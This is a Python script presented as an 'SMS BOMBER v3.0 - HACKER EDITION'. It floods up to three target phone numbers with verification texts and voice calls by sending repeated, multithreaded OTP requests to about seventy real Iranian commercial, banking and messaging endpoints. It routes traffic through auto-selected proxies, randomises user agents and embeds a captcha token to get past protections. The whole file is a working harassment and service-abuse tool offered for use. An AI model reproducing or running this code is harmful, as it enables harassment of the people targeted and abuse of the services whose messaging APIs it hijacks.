import os
import sys
import json
import random
import time
import requests
import subprocess
from colorama import Fore, init, Style
from fake_useragent import UserAgent
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import struct

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ===== HACKER THEME COLORS =====
RED = Fore.LIGHTRED_EX
DARK_RED = Fore.RED
GREEN = Fore.LIGHTGREEN_EX
YELLOW = Fore.LIGHTYELLOW_EX
CYAN = Fore.LIGHTCYAN_EX
WHITE = Fore.WHITE
MAGENTA = Fore.LIGHTMAGENTA_EX
BRIGHT = Style.BRIGHT

# ===== SOUND SYSTEM =====
SOUND_FILE = None
SOUND_ENABLED = False

def init_sound():
    """راه‌اندازی سیستم صدا"""
    global SOUND_FILE, SOUND_ENABLED
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    sound_path = os.path.join(script_dir, "start.mp3")
    
    if os.path.exists(sound_path):
        SOUND_FILE = sound_path
        SOUND_ENABLED = True
        print(f"{GREEN}[🔊] Sound file found: start.mp3")
        return True
    else:
        alt_paths = [
            "/sdcard/Music/start.mp3",
            "/storage/emulated/0/Music/start.mp3",
            os.path.expanduser("~/storage/downloads/start.mp3")
        ]
        for path in alt_paths:
            if os.path.exists(path):
                SOUND_FILE = path
                SOUND_ENABLED = True
                print(f"{GREEN}[🔊] Sound file found: {path}")
                return True
        
        SOUND_ENABLED = False
        print(f"{YELLOW}[🔊] Sound file not found. Running without sound.")
        print(f"{YELLOW}[!] Place start.mp3 next to the script")
        return False

def play_start_sound():
    """پخش صدای شروع"""
    if SOUND_ENABLED and SOUND_FILE:
        try:
            subprocess.run(['termux-media-player', 'play', SOUND_FILE], 
                          capture_output=True, timeout=10, check=False)
            return True
        except:
            try:
                if os.name == 'nt':
                    import winsound
                    winsound.PlaySound(SOUND_FILE, winsound.SND_FILENAME)
                    return True
            except:
                pass
            try:
                subprocess.run(['mpg123', SOUND_FILE], 
                              capture_output=True, timeout=10, check=False)
                return True
            except:
                pass
    return False

def play_beep(freq=800, duration=300):
    """پخش صدای بوق"""
    try:
        subprocess.run(['termux-speaker', '--freq', str(freq), '--duration', str(duration)], 
                      capture_output=True, timeout=1, check=False)
    except:
        pass

# ===== RUN SOUND INIT =====
init_sound()

# Generate a random User-Agent
def get_random_user_agent():
    ua = UserAgent()
    return ua.random

# ===== PROXY TESTER =====
def test_proxy(proxy_str, timeout=5):
    """
    تست پروکسی و محاسبه پینگ
    برمیگرداند: (is_alive, ping_ms, ip, country)
    """
    try:
        # تست با ipify برای دیدن IP خروجی
        start_time = time.time()
        
        proxies = {
            "http": proxy_str,
            "https": proxy_str.replace("http://", "https://") if proxy_str.startswith("http://") else proxy_str
        }
        
        response = requests.get(
            "https://api.ipify.org?format=json",
            proxies=proxies,
            timeout=timeout,
            verify=False
        )
        
        ping_ms = int((time.time() - start_time) * 1000)
        
        if response.status_code == 200:
            data = response.json()
            ip = data.get("ip", "Unknown")
            
            # تشخیص کشور از IP (با ip-api.com)
            try:
                geo_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
                if geo_response.status_code == 200:
                    geo_data = geo_response.json()
                    country = geo_data.get("countryCode", "??")
                else:
                    country = "??"
            except:
                country = "??"
            
            return True, ping_ms, ip, country
        else:
            return False, 0, None, None
            
    except requests.exceptions.Timeout:
        return False, 0, None, None
    except requests.exceptions.ConnectionError:
        return False, 0, None, None
    except Exception:
        return False, 0, None, None

def test_and_select_proxy(proxies):
    """تست همه پروکسی‌ها و انتخاب بهترین (کمترین پینگ)"""
    if not proxies:
        print(f"{YELLOW}⚠ No proxies to test!")
        return None, None, None
    
    print(f"{CYAN}🔍 Testing {len(proxies)} proxies...")
    print(f"{CYAN}┌────────────────────────────────────────────────────────────┐")
    
    alive_proxies = []
    
    for i, proxy in enumerate(proxies, 1):
        # نمایش پیشرفت
        bar_length = 30
        percent = i / len(proxies)
        filled = int(bar_length * percent)
        bar = '█' * filled + '░' * (bar_length - filled)
        sys.stdout.write(f"\r{CYAN}│ {bar} {percent*100:.0f}%  Testing proxy {i}/{len(proxies)}")
        sys.stdout.flush()
        
        is_alive, ping, ip, country = test_proxy(proxy)
        
        if is_alive:
            status = f"{GREEN}✓ Alive"
            alive_proxies.append({
                "proxy": proxy,
                "ping": ping,
                "ip": ip,
                "country": country
            })
            
            # نمایش پروکسی‌های زنده
            print(f"\r{CYAN}│ {GREEN}✓ {proxy[:40]:<40} {GREEN}Ping: {ping}ms  {country}  {ip}")
        else:
            print(f"\r{CYAN}│ {RED}✗ {proxy[:40]:<40} {RED}Dead")
    
    print(f"{CYAN}└────────────────────────────────────────────────────────────┘\n")
    
    if not alive_proxies:
        print(f"{RED}❌ No alive proxies found!")
        return None, None, None
    
    # مرتب‌سازی بر اساس پینگ (کمترین اول)
    alive_proxies.sort(key=lambda x: x["ping"])
    
    # انتخاب بهترین
    best = alive_proxies[0]
    
    print(f"{GREEN}🏆 BEST PROXY SELECTED:")
    print(f"{GREEN}   Proxy: {best['proxy']}")
    print(f"{GREEN}   Ping:  {best['ping']}ms")
    print(f"{GREEN}   IP:    {best['ip']}")
    print(f"{GREEN}   Country: {best['country']}")
    print(f"{GREEN}   Total Alive: {len(alive_proxies)}/{len(proxies)}\n")
    
    return best["proxy"], best["ping"], alive_proxies

# ===== PROXY MANAGEMENT =====
def load_proxies():
    proxies = []
    try:
        # اول سعی کن از فایل بخونه
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if not line.startswith("http"):
                            line = f"http://{line}"
                        proxies.append(line)
            if proxies:
                print(f"{GREEN}✓ Loaded {len(proxies)} proxies from file")
            else:
                print(f"{YELLOW}⚠ No proxies found in proxies.txt")
        else:
            print(f"{YELLOW}⚠ proxies.txt not found. Trying to download...")
            proxies = download_proxies()
    except Exception as e:
        print(f"{RED}✗ Error loading proxies: {e}")
        proxies = download_proxies()
    
    return proxies

def download_proxies():
    """دانلود پروکسی‌های تست‌شده ایرانی از OpenRay"""
    try:
        print(f"{YELLOW}📥 Downloading Iranian proxies from OpenRay...")
        url = "https://raw.githubusercontent.com/sakha1370/OpenRay/refs/heads/main/output_iran/iran_top100_checked.txt"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            proxies = [p.strip() for p in proxies if p.strip()]
            # ذخیره در فایل
            with open("proxies.txt", "w") as f:
                f.write("\n".join(proxies))
            print(f"{GREEN}✓ Downloaded {len(proxies)} proxies from OpenRay")
            return proxies
        else:
            print(f"{RED}✗ Failed to download proxies")
            return []
    except Exception as e:
        print(f"{RED}✗ Error downloading proxies: {e}")
        return []

def get_random_proxy(proxies):
    if proxies:
        proxy = random.choice(proxies)
        return {"http": proxy, "https": proxy.replace("http://", "https://") if proxy.startswith("http://") else proxy}
    return None

# Format phone number
def format_phone(phone):
    phone = ''.join(filter(str.isdigit, phone))
    if phone.startswith('0'):
        phone = phone[1:]
    if phone.startswith('98'):
        phone = phone[2:]
    return phone

# Show banner - Hacker Theme (GREEN MASK)
def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{GREEN}::::::::::::::::::::::::::::::::::::::::::::::::::
{GREEN}:::::::::::::::::=*%%%%%%%%%%*+=-:::::::::::::::::
{GREEN}:::::::::=%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=:::::::::
{GREEN}:::::::%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%-::::::
{GREEN}:::::-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:::::
{GREEN}:::::%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=::::
{GREEN}::::%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%::::
{GREEN}::::%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%::::
{GREEN}:::+%%%%%+:::::::=%%%%%%%%%%%%%%#:::::::+%%%%%%:::
{GREEN}:::%%%%%%%%%%:-#+:::%%%%%%%%%*::::::::%%%%%%%%%:::
{GREEN}:::%%%%%%%%%%%%%=%*:::%%%%%%:::-::%%%%%%%%%%%%%:::
{GREEN}:::%%%%%%%%%%%%%%%:+%%%%%%%%%%+:%%%%%%%%%%%%%%%:::
{GREEN}:::%%%%%%%%%%%%%%%%*:%%%%%%%%:%%%%%%%%%%%%%%%%%:::
{GREEN}:::%%%%%%%+:::-*%%%%::%%%%%%%%%%%+::::::*%%%%%%:::
{GREEN}:::%%%%::::::::::::%=:=%%%%%%%%::::::::::::*%%%:::
{GREEN}:::%%%:=*%%%%%%%%%%%-::%%%%%%%%%%%%%%%%%%%%%%%%:::
{GREEN}:::%%%%%%%%%%%%%%%%%:::%%%%%%%%%%%%%%%%%%%%%%%%:::
{GREEN}:::%%%%%%%%%%%%%%%%%:::%%%%%%%%%%%%%%%%%%%%%%%%:::
{GREEN}::::%%%%%%%%%%%%%%%%:::%%%%%%%%%%%%%%%%%%%%%%%%:::
{GREEN}:::==%%%%%%%%%%%%%%:::=%%%%%%%%%%%%%%%%%%%%%%%::::
{GREEN}::::%::%%%%%%%%%%:::::#%%%%%%%%%%%%%%%%%%%%%*+::::
{GREEN}::::%%:*::%%%%%%%:*%::%%%%%%%%%*%%%%%%%::-::%:::::
{GREEN}:::::%%:%::%%%%%%%%%::%%%%%%%%%%%%%%%%%:*%:%%:::::
{GREEN}::::::%%-%:::%%%%%%%%:%%%%%%%%%%%%%%%::%%:%%::::::
{GREEN}:::::::%%-+%::::=%%%::::+=:::%%%%%=:::%%:%%:::::::
{GREEN}::::::::%%+:%%%=:::::::%%%:::::::::+%%+:%%-:::::::
{GREEN}:::::::::%%%::%%%%%%%%%%%%%#++#%%%%%%%:%%:::::::::
{GREEN}::::::::::%%%::+%%%%%%%%%%%%%%%%%%%%%+%%::::::::::
{GREEN}:::::::::::%%%::%%%%**%%%%%%%%%%%%%%%%%:::::::::::
{GREEN}::::::::::::%%%:%%%%%%%::::%%%%%%%%%%%::::::::::::
{GREEN}:::::::::::::#%%%%%%%%%:::=%%%%%%%%%#:::::::::::::
{GREEN}:::::::::::::::%%%%%%%:::::%%%%%%%%:::::::::::::::
{GREEN}::::::::::::::::%%%%%%:::::%%%%%%%::::::::::::::::
{GREEN}:::::::::::::::::#%%%%:::::%%%%%%:::::::::::::::::
{GREEN}:::::::::::::::::::%%%%:::#%%%%:::::::::::::::::::
{GREEN}::::::::::::::::::::::*:::=%#:::::::::::::::::::::
{GREEN}::::::::::::::::::::::::::::::::::::::::::::::::::
"""
    print(banner)
    
    # ===== بنر قرمز زیر ماسک =====
    print(f"{RED}")
    print(""" ________  _____ ______   ___  ________     """)
    print("""|\\   __  \\|\\   _ \\  _   \\|\\  \\|\\   __  \\    """)
    print("""\\ \\  \\|\\  \\ \\  \\\\\\__\\ \\  \\ \\  \\ \\  \\|\\  \\   """)
    print(""" \\ \\   __  \\ \\  \\\\|__| \\  \\ \\  \\ \\   _  _\\  """)
    print("""  \\ \\  \\ \\  \\ \\  \\    \\ \\  \\ \\  \\ \\  \\\\  \\| """)
    print("""   \\ \\__\\ \\__\\ \\__\\    \\ \\__\\ \\__\\ \\__\\\\ _\\ """)
    print("""    \\|__|\\|__|\\|__|     \\|__|\\|__|\\|__|\\|__|""")
    print(f"{Style.RESET_ALL}")
    # =================================
    
    print()
    print()
    
    print(f"{GREEN}{BRIGHT}☠️  SMS BOMBER v3.0 - HACKER EDITION  ☠️")
    print(f"{GREEN}═" * 60)
    print(f"{RED}{BRIGHT}☠️ ANY IMPROPER OR ILLEGAL USE IS THE RESPONSIBILITY OF THE INDIVIDUAL. ☠️{Style.RESET_ALL}")
    print(f"{GREEN}═" * 60 + "\n")
    
    # 🎵 پخش صدای شروع
    if not play_start_sound():
        try:
            play_beep(800, 300)
            time.sleep(0.1)
            play_beep(1000, 300)
            time.sleep(0.1)
            play_beep(1200, 400)
        except:
            pass

# Get services
def get_services(n, n0, n_plus):
    services = []
    
    def j(name, url, payload):
        services.append((name, "POST", url, payload, {"User-Agent": get_random_user_agent(), "Accept": "application/json", "Content-Type": "application/json"}, "json"))
    
    def custom_json(name, url, payload, headers):
        services.append((name, "POST", url, payload, headers, "json"))
    
    # ── Messaging ────────────────────────────────────────────
    j("shadmessenger", "https://shadmessenger12.iranlms.ir/",
        {"api_version": "3", "method": "sendCode", "data": {"phone_number": n, "send_type": "SMS"}})
    j("rubika", "https://messengerg2c4.iranlms.ir/",
        {"api_version": "3", "method": "sendCode", "data": {"phone_number": n, "send_type": "SMS"}})
    
    # ── Ride-sharing & Transport ─────────────────────────────
    j("tapsi", "https://tap33.me/api/v2/user",
        {"credential": {"phoneNumber": n0, "role": "PASSENGER"}})
    j("tapsi_driver", "https://api.tapsi.ir/api/v2.2/user",
        {"credential": {"phoneNumber": n0, "role": "DRIVER"}, "otpOption": "SMS"})
    j("snapp_digital", "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
        {"cellphone": n})
    custom_json("snappexpress", "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
        {"cellphone": n},
        {"User-Agent": get_random_user_agent(), "Accept": "application/json", "Content-Type": "application/json",
         "params": {"client": "PWA", "optionalClient": "PWA", "deviceType": "PWA",
                    "appVersion": "5.6.6", "optionalVersion": "5.6.6", "UDID": "bb65d956-f88b-4fec-9911-5f94391edf85"}})
    
    # ── E-commerce & Shopping ────────────────────────────────
    j("digikala", "https://api.digikala.com/v1/user/authenticate/", {"username": n0})
    j("digikala_forgot", "https://api.digikala.com/v1/user/forgot/check/", {"username": n0})
    j("digikalajet", "https://api.digikalajet.ir/user/login-register/", {"phone": n})
    j("sheypoor", "https://www.sheypoor.com/api/v10.0.0/auth/send", {"username": n0})
    j("divar", "https://api.divar.ir/v5/auth/authenticate", {"phone": n})
    j("alibaba", "https://ws.alibaba.ir/api/v3/account/mobile/otp", {"phoneNumber": n0})
    j("offdecor", "https://www.offdecor.com/index.php?route=account/login/sendCode", {"phone": n})
    j("sunnybook", "https://sunnybook.ir/Home/RegisterUser",
        {"name": "Mr", "password": "123456", "mobile": n})
    j("shimashoes", "https://shimashoes.com/api/customer/member/register/", {"email": n0})
    j("electrastore", "https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code", {"telephone": n0})
    j("parkbag", "https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber",
        {"ReturnUrl": "https://parkbag.com/", "MobaileNumber": n})
    j("mahouney", "https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber",
        {"ReturnUrl": "https://mahouney.com/", "MobaileNumber": n0})
    j("hamrahsport", "https://hamrahsport.com/send-otp",
        {"cell": n, "name": "persian_string", "agree": "1", "send_otp": "1", "otp": ""})
    j("baradarantoy", "https://baradarantoy.ir/send_confirm_sms_ajax.php", {"user_tel": n0})
    j("badparak", "https://badparak.com/register/request_verification_code", {"mobile": n0})
    j("tajtehran", "https://tajtehran.com/RegisterRequest", {"mobile": n, "password": "mamad1234"})
    j("cheshmandazketab", "https://www.cheshmandazketab.ir/Register", {"phone": n0, "login": "1"})
    
    # ── News & Media ─────────────────────────────────────────
    j("bartarinha", "https://bartarinha.com/Advertisement/Users/RequestLoginMobile",
        {"mobileNo": n0, "X-Requested-With": "XMLHttpRequest"})
    
    # ── Gaming & Video Streaming ─────────────────────────────
    j("gamefa", "https://gamefa.com/?login=true", {"identifier": n})
    
    # ── Finance & Banking ────────────────────────────────────
    j("sibbank", "https://api.sibbank.ir/v1/auth/login", {"phone_number": n0})
    j("zarinplus", "https://api.zarinplus.com/user/zarinpal-login", {"phone_number": f"98{n}"})
    j("mydigipay", "https://app.mydigipay.com/digipay/api/users/send-sms",
        {"cellNumber": n0, "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f",
         "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}})
    j("kilid", "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start",
        {"mobile": n, "realm": "PORTAL"})
    j("lendo", "https://api.lendo.ir/api/customer/auth/send-otp", {"mobile": n0})
    
    # ── Travel & Accommodation ───────────────────────────────
    j("jabama", "https://gw.jabama.com/api/v4/account/send-code", {"mobile": n0})
    j("trip_register", "https://gateway.trip.ir/api/registers", {"CellPhone": n})
    
    # ── Voice Call OTP ───────────────────────────────────────
    j("digikalajet_call", "https://api.digikalajet.ir/user/login-register/voice-call/",
        {"phone": n, "g-recaptcha-response": "03AKH6MRGaYQlelcSA/R8S1u1DbQnaEvlsAB17X4IPxVLf9k40V1kgm28kvwcsPiye-TD72H51yuyJiJBjRoJOt87L0BWoXCik2pRRuadnOTo0hWs4fjbrly-RcXo_vvCdmffLRhrjYRf86SN4CuqXqnCSHhJ8sjRwNMTycjcL_uxpZd28V8XDX95BVUOFQzH6lvmeffiHI8KpAQr-8UWvRYjBhLfi-JwJK0BJGJt118q9Em7EMIwuN5kyUXMS2oBjORz2E_TPuVHjq65X_4oTRPxiN2-119XpYeB-AvwXk8q5v7rPunbt1JzUHM_6a_xCtjsFscBbBlpo-VJWzJWZVJpxl9CgZAx8I4bkEquhKjOghnK3mjil3TN2ColewBCGmCnCdNy0tdL6Q53_txJOUFORBx7KGjtV28-n5xkIaKw39r3EMwc__OhPe56LORbTCj6Zjt8uH4y4c03mVEkkoO5-huuxBNiz4_j440c3oAmuuB7A8P4-G2K5cJtDD-PHy1ZTH1WFdN0tJ_cox5-qXwXbOA1btJuJg9lvICRbCxHytO6rfeG39EX1X4VGR43brxzVliub0P9ZWDTJOwnWj6FUAesecp86hEA"})
    
    # ===== DIGIKALA CALL (FIXED WITH CUSTOM HEADERS) =====
    custom_json("digikala_call", "https://api.digikala.com/v1/user/authenticate/",
        {"backUrl": "/", "username": n0, "otp_call": "true"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
         "Accept": "application/json", 
         "Content-Type": "application/json"})
    # ======================================================
    
    # ── Other Services ───────────────────────────────────────
    j("flightio", "https://app.flightio.com/bff/Authentication/CheckUserKey",
        {"userKey": n, "userKeyType": 1})
    j("mobit", "https://api.mobit.ir/api/web/v8/register/register", {"number": n0})
    j("novinparse", "https://novinparse.com/Page/PageAction.aspx",
        {"Action": "SendVerifyCode", "verifyCode": "", "repeatFlag": "true", "mobile": n0})
    j("manoshahr", "https://manoshahr.ir/jq.php",
        {"mobile": n0, "class_name": "public_login", "function_name": "sendCode"})
    j("sibche", "https://api.sibche.com/profile/sendCode", {"mobile": n0})
    j("hiword", "https://hiword.ir/wp-json/otp-login/v1/login", {"identifier": n})
    j("buskool", "https://buskool.com/api/v1/auth/send-otp", {"phone": n})
    j("see5", "https://crm.see5.net/api_ajax/sendotp.php", {"mobile": n, "action": "sendsms"})
    j("ifollow", "https://i.devslop.app/app/ifollow/api/otp.php/", {"number": n, "state": "number"})
    j("exo", "https://exo.ir/index.php?route=account/mobile_login", {"mobile_number": n})
    j("pakhsh", "https://www.pakhsh.shop/wp-admin/admin-ajax.php",
        {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": n, "csrf": "fdaa7fc8e6",
         "login": "2", "username": "", "email": "", "captcha": "", "captcha_ses": "", "json": "1", "whatsapp": "0"})
    j("mobogift", "https://mobogift.com/signin", {"username": n})
    j("nikanbike", f"https://nikanbike.com/?rand={n}",
        {"controller": "authentication", "back": "my-account", "fc": "module", "ajax": "true",
         "module": "iverify", "phone_mobile": n0, "SubmitCheck": ""})
    j("dastaneman", "https://dastaneman.com/User/SendCode", {"mobile": "0098" + n})
    j("namava", "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", {"UserName": n_plus})
    j("technolife", "https://www.technolife.ir/shop",
        {"query": "query check_customer_exists($username: String ,$repeat:Boolean){ check_customer_exists(username: $username , repeat:$repeat){ result request_id } }",
         "variables": {"username": n0}, "g-recaptcha-response": ""})
    j("limoome", "https://my.limoome.com/api/auth/login/otp", {"mobileNumber": n, "country": "1"})
    j("raghamapp", "https://web.raghamapp.com/api/users/code", {"phone": n})
    j("otaghak", "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", {"userName": n0})
    j("tikban", "https://tikban.com/Account/LoginAndRegister",
        {"phoneNumberCode": "+98", "CellPhone": n, "CaptchaKey": "null", "JustMobilephone": n.lstrip("0")})
    j("kasbinoapp", "https://kasbinoapp.ir/kasbinoEngine1/RequestC",
        {"p1001": n0, "p1002": "registerSms", "token": "e0d4cc39-b5d3-47ea-8ede-6ead5eed3b8a.e000af00-d00d-0da0-0f00-000d00000cc0", "RC": "7be86c2a5b54"})
    j("janebi", "https://janebi.com/signin?do", {"resend": n0})
    j("pinket", "https://pinket.com/api/cu/v2/phone-verification", {"phoneNumber": n0})
    j("twsms", "https://twsms.ir/client/register.php", {"mobile": n0, "agree": "agree", "sendsms": "1"})
    j("bikoplus", "https://bikoplus.com/account/check-phone-number", {"phoneNumber": n0})
    j("khodro45", "https://khodro45.com/api/v1/customers/otp/", {"mobile": n0})
    j("irantic", "https://www.irantic.com/api/login/request", {"mobile": n0})
    j("balad", "https://account.api.balad.ir/api/web/auth/login/", {"phone_number": n0, "os_type": "W"})
    j("bornosmode", "https://bornosmode.com/api/loginRegister/", {"mobile": n0, "withOtp": 1})
    
    # ── New APIs (Jabama Call) ──────────────────────────────
    j("jabama_call", "https://gw.jabama.com/api/v4/account/send-code", {"mobile": n0, "type": "voice"})
    
    # ── Custom Header Variants ───────────────────────────────
    custom_json("rubika_custom", "https://messengerg2c4.iranlms.ir/",
        {"api_version": "3", "method": "sendCode", "data": {"phone_number": n, "send_type": "SMS"}},
        {"User-Agent": get_random_user_agent(), "Accept": "application/json", "Host": "messengerg2c4.iranlms.ir", "content-type": "text/plain"})
    custom_json("shadmessenger_custom", "https://shadmessenger12.iranlms.ir/",
        {"api_version": "3", "method": "sendCode", "data": {"phone_number": n, "send_type": "SMS"}},
        {"User-Agent": get_random_user_agent(), "Accept": "application/json", "content-type": "text/plain"})
    
    return services

# Send a request to an API endpoint (با timeout=2 و verify=False برای سرعت بیشتر)
def send_request(api, n, n0, n_plus, proxy=None):
    name, method, url, data, headers, data_type = api
    
    try:
        if data_type == "json":
            req_headers = {k: v for k, v in headers.items() if k != "params"}
            extra_params = headers.get("params", {})
            if data is None:
                response = requests.post(url, headers=req_headers, params=extra_params, timeout=2, verify=False, proxies=proxy)
            else:
                response = requests.post(url, json=data, headers=req_headers, params=extra_params, timeout=2, verify=False, proxies=proxy)
        else:
            response = requests.post(url, data=data, headers=headers, timeout=2, verify=False, proxies=proxy)
        
        if response.status_code in [200, 201, 202, 204, 302, 303, 307, 308]:
            return name, True
        else:
            return name, False
    except Exception:
        return name, False

# Send requests to all APIs for a single target
def send_requests_for_target(phone_number, thread_count, spam_count, best_proxy):
    n = format_phone(phone_number)
    n0 = f"0{n}"
    n_plus = f"+98{n}"
    
    apis = get_services(n, n0, n_plus)
    
    # تنظیم پروکسی
    proxy = None
    if best_proxy:
        proxy = {
            "http": best_proxy,
            "https": best_proxy.replace("http://", "https://") if best_proxy.startswith("http://") else best_proxy
        }
    
    print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
    print(f"{GREEN}│ {RED}☠️ TARGET: {GREEN}{n0}")
    print(f"{GREEN}│ {RED}💀 APIS: {GREEN}{len(apis)}")
    print(f"{GREEN}│ {RED}🔥 THREADS: {GREEN}{thread_count}")
    print(f"{GREEN}│ {RED}🩸 SPAM: {GREEN}{spam_count}")
    print(f"{GREEN}│ {RED}🌐 PROXY: {GREEN}{best_proxy if best_proxy else 'None'}")
    print(f"{GREEN}└────────────────────────────────────────────────────────────┘\n")
    
    total_success = 0
    total_fail = 0
    
    for round_num in range(1, spam_count + 1):
        print(f"{RED}▶ ROUND {round_num}/{spam_count} - ATTACK IN PROGRESS...")
        
        success_count = 0
        fail_count = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = {executor.submit(send_request, api, n, n0, n_plus, proxy): api for api in apis}
            
            for future in as_completed(futures):
                name, success = future.result()
                
                if success:
                    success_count += 1
                    total_success += 1
                    print(f"{GREEN}[✔] {name}  ← NFO SUCCESSFUL")
                else:
                    fail_count += 1
                    total_fail += 1
                    print(f"{RED}[✘] {name}   ← BLOCKED")
        
        elapsed = time.time() - start_time
        print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
        print(f"{GREEN}│ {GREEN}✔ SUCCESS: {success_count:<4} {RED}✘ FAILED: {fail_count:<4} {YELLOW}⏱ {elapsed:.1f}s  {GREEN}│")
        print(f"{GREEN}└────────────────────────────────────────────────────────────┘\n")
    
    return total_success, total_fail

# Send requests to multiple targets (max 3)
def send_requests(phone_numbers, thread_count, spam_count, best_proxy):
    if isinstance(phone_numbers, str):
        phone_numbers = [phone_numbers]
    
    # محدودیت ۳ شماره
    if len(phone_numbers) > 3:
        print(f"{RED}⚠️ Maximum 3 targets allowed! Using first 3.")
        phone_numbers = phone_numbers[:3]
    
    print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
    print(f"{GREEN}│ {RED}☠️ TARGETS: {GREEN}{', '.join(['0'+format_phone(p) for p in phone_numbers])}")
    print(f"{GREEN}│ {RED}💀 TOTAL TARGETS: {GREEN}{len(phone_numbers)}")
    print(f"{GREEN}│ {RED}🔥 THREADS: {GREEN}{thread_count}")
    print(f"{GREEN}│ {RED}🩸 SPAM PER TARGET: {GREEN}{spam_count}")
    print(f"{GREEN}│ {RED}🌐 PROXY: {GREEN}{best_proxy if best_proxy else 'None'}")
    print(f"{GREEN}└────────────────────────────────────────────────────────────┘\n")
    
    all_results = []
    total_success_all = 0
    total_fail_all = 0
    
    for idx, phone in enumerate(phone_numbers, 1):
        print(f"{YELLOW}▶ Processing target {idx}/{len(phone_numbers)}: {phone}")
        success, fail = send_requests_for_target(phone, thread_count, spam_count, best_proxy)
        all_results.append({'phone': phone, 'success': success, 'fail': fail})
        total_success_all += success
        total_fail_all += fail
        print()
    
    # گزارش نهایی
    print(f"{GREEN}{'█' * 60}")
    print(f"{RED}📊 FINAL REPORT")
    print(f"{GREEN}{'█' * 60}")
    
    for res in all_results:
        total = res['success'] + res['fail']
        rate = (res['success'] / total * 100) if total > 0 else 0
        print(f"{GREEN}📱 {res['phone']}  → {GREEN}✔ {res['success']}  {RED}✘ {res['fail']}  {YELLOW}📈 {rate:.1f}%")
    
    print(f"{GREEN}────────────────────────────────────────────────────────────")
    total_all = total_success_all + total_fail_all
    rate_all = (total_success_all / total_all * 100) if total_all > 0 else 0
    print(f"{YELLOW}📦 TOTAL:        → {GREEN}✔ {total_success_all}  {RED}✘ {total_fail_all}  {YELLOW}📈 {rate_all:.1f}%")
    print(f"{GREEN}{'█' * 60}\n")
    
    # 🎵 بوق پایان
    try:
        play_beep(800, 200)
        time.sleep(0.1)
        play_beep(1000, 200)
        time.sleep(0.1)
        play_beep(1200, 300)
    except:
        pass

# Main function
def main():
    show_banner()
    
    # ===== STEP 1: Load Proxies =====
    proxies = load_proxies()
    print()
    
    # ===== STEP 2: Test Proxies and Select Best =====
    if proxies:
        best_proxy, best_ping, alive_proxies = test_and_select_proxy(proxies)
        if best_proxy:
            print(f"{GREEN}✅ Using best proxy: {best_proxy} (Ping: {best_ping}ms)")
        else:
            print(f"{YELLOW}⚠ No alive proxies found. Running without proxy.")
            best_proxy = None
    else:
        print(f"{YELLOW}⚠ No proxies available. Running without proxy.")
        best_proxy = None
    
    print()
    
    # ===== STEP 3: Main Loop =====
    while True:
        print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
        print(f"{GREEN}│ {GREEN}☠️ Phone Number : {WHITE}", end="")
        phone_input = input().strip()
        
        if phone_input.lower() == 'q':
            print(f"{GREEN}└────────────────────────────────────────────────────────────┘")
            print(f"\n{RED}☠️ OPERATION TERMINATED {RED}❤️")
            break
        
        if not phone_input:
            print(f"{RED}│  ✘ INVALID INPUT!")
            continue
        
        # جداسازی شماره‌ها
        phone_numbers = phone_input.split()
        if len(phone_numbers) > 3:
            print(f"{YELLOW}⚠️ Maximum 3 targets! Using first 3.")
            phone_numbers = phone_numbers[:3]
        
        print(f"{GREEN}│ {RED}💀 SPAM COUNT {GREEN}(1-50, default=1): {WHITE}", end="")
        spam_input = input().strip()
        
        if not spam_input:
            spam_count = 1
        else:
            try:
                spam_count = int(spam_input)
                if not (1 <= spam_count <= 50):
                    print(f"{RED}│  ✘ INVALID RANGE! (1-50)")
                    continue
            except ValueError:
                print(f"{RED}│  ✘ INVALID INPUT!")
                continue
        
        print(f"{GREEN}│ {YELLOW}🔥 THREADS {GREEN}(1-30, default=10): {WHITE}", end="")
        thread_input = input().strip()
        
        if not thread_input:
            thread_count = 10
        else:
            try:
                thread_count = int(thread_input)
                if not (1 <= thread_count <= 30):
                    print(f"{RED}│  ✘ INVALID RANGE! (1-30)")
                    continue
            except ValueError:
                print(f"{RED}│  ✘ INVALID INPUT!")
                continue
        
        print(f"{GREEN}└────────────────────────────────────────────────────────────┘\n")
        
        send_requests(phone_numbers, thread_count, spam_count, best_proxy)
        
        print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
        print(f"{GREEN}│ {GREEN}CONTINUE OPERATION? {GREEN}(y/n): {WHITE}", end="")
        again = input().strip().lower()
        print(f"{GREEN}└────────────────────────────────────────────────────────────┘")
        
        if again != 'y':
            print(f"\n{RED}☠️ OPERATION TERMINATED {RED}❤️")
            break

if __name__ == "__main__":
    try:
        main()
